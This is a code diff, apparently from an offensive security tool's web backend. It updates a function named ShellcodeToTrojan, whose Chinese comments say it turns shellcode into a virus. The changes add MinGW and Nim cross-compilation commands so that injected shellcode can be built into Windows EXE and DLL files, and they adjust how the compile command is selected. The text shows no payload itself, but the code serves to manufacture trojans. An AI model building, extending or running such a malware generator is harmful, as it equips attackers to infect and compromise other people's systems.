@@ -21,7 +21,7 @@ Language2Command={
                 "x86":
                 {
                     "exe":"i586-mingw32msvc-gcc -mwindows -o ",
-                    "dll":""
+                    "dll":"i686-w64-mingw32-gcc -fPIC -shared -o "
                 },
                 "x64":
                 {
@@ -34,7 +34,7 @@ Language2Command={
                 "x86":
                 {
                     "exe": "i586-mingw32msvc-g++ -mwindows -o ",
-                    "dll": ""
+                    "dll": "i686-w64-mingw32-g++ -fPIC -shared -o "#编译c++dll的时候需要在每个函数前面添加extern "C"，不然导出函数是C++编译器编译之后的函数名
                 },
                 "x64":
                 {
@@ -61,12 +61,12 @@ Language2Command={
             {
                     "x86":
                         {
-                            "exe": "",
+                            "exe": "nim c -d:mingw --app:console  --cpu:i386  --out:",
                             "dll": None#"nim c -d:mingw --app:lib --nomain --cpu:i386 --out:"
                         },
                     "x64":
                         {
-                            "exe": "",
+                            "exe": "nim c -d:mingw --app:console --cpu:amd64 --out:",
                             "dll": "nim c -d:mingw --app:lib --nomain  --cpu:amd64 --out:"
                         }
 
@@ -163,7 +163,7 @@ def ShellcodeToTrojan(request):#shellcode转换生成病毒
                                 return JsonResponse({'message': "暂不支持其他架构~", 'code': 440, })
 
                             elif ShellcodeArchitecture=="x86" or ShellcodeArchitecture=="x64":
-                                Command=Language2Command["linux"][ScriptModule.__language__.split('.')[0]][ShellcodeArchitecture][ScriptModule.__process__.split('.')[0]]#通过文件中的语言类型和生成文件进行提取命令
+                                Command=Language2Command["linux"][ScriptModule.__language__.split('.')[1]][ShellcodeArchitecture][ScriptModule.__process__.split('.')[1]]#通过文件中的语言类型和生成文件进行提取命令
                                 if Command==None:
                                     return JsonResponse({'message': "呐呐呐！该种组合无法进行编译，请使用其他插件~", 'code': 450, })
                                 else:
